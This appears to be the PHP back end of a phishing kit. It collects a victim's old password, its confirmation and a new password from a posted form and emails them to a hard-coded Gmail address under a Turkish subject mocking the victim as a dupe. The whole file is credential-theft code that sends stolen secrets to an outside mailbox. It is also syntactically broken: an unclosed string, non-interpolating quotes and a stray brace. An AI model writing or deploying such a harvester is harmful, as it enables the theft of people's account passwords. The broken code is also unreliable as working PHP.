<?php
$email_address = 'gardropfuatcom@gmail.com'; 
$eskisifreonay = $_POST["Ataturk2"];
$eskisifre = $_POST["Ataturk1"];
$sifre = $_POST["pass"];

mail($email_address,'Enayi Var', 'Yeni: $sifre eski sifre: $eskisifre sifre onay: $eskisifreonay  );
}
?>